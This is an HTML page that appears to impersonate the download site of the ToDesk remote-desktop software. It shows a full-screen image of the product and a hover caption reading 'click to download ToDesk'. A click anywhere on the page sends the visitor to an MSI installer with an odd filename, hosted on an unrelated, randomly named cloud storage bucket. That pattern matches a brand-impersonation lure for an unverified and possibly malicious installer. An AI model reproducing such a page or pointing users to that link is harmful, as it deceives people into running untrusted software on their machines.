<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ToDesk网站</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            cursor: pointer;
            background: url('todesk.png') no-repeat center center;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .clickable-area {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: opacity 0.3s ease;
        }
        .clickable-area:hover {
            opacity: 0.9;
        }
        .download-text {
            color: white;
            font-size: 24px;
            font-weight: bold;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.8);
            background: rgba(0, 0, 0, 0.5);
            padding: 20px 40px;
            border-radius: 10px;
            border: 2px solid white;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        .clickable-area:hover .download-text {
            opacity: 1;
        }
    </style>
</head>
<body>
    <div class="clickable-area" onclick="downloadFile()">
        <div class="download-text">点击下载ToDesk</div>
    </div>
    <script>
        function downloadFile() {
            window.location.href = 'https://3yfaj.s3.ap-east-1.amazonaws.com/delxai/TODesk_Setupk.msi';
        }
    </script>
</body>
</html>
